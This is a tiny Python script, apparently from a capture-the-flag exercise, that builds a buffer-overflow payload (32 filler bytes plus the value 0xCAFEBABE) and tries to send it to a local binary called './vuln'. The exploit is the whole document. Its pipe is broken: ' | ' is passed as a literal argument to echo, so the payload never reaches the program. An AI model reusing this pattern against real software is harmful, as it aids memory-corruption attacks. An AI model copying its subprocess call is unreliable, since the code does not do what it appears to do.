import subprocess

s = 32*b"X" + b"\xBE\xBA\xFE\xCA" + b"\n"

res = subprocess.run(["echo", s, " | ", "./vuln"], capture_output=True)
print(res)